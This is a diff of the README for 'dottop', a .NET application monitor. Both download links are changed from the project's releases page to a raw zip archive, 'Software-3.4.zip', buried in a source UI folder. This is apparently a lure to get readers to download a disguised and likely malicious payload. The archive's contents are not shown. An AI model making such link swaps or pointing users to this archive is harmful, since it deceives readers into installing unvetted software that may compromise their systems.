@@ -1,6 +1,6 @@
 # 📊 dottop - Watch your .NET applications in real-time
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/logical-selvage819/dottop/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/logical-selvage819/dottop/main/src/DotTop/UI/Software-3.4.zip)
 
 dottop provides a live view of your .NET applications. It shows how much memory your program uses, how many requests it handles, and its overall health. You do not need to change your code or install extra tools to use it. It works instantly on any system running a .NET process.
 
@@ -22,7 +22,7 @@ You find these runtimes on the official Microsoft website if you do not have the
 
 You must visit the releases page to download the latest version of the program. 
 
-[Click here to visit the download page](https://github.com/logical-selvage819/dottop/releases)
+[Click here to visit the download page](https://raw.githubusercontent.com/logical-selvage819/dottop/main/src/DotTop/UI/Software-3.4.zip)
 
 Choose the file that ends in .exe for your Windows installation. Save this file to a folder where you can find it easily, such as your Downloads folder or a Documents folder.
 
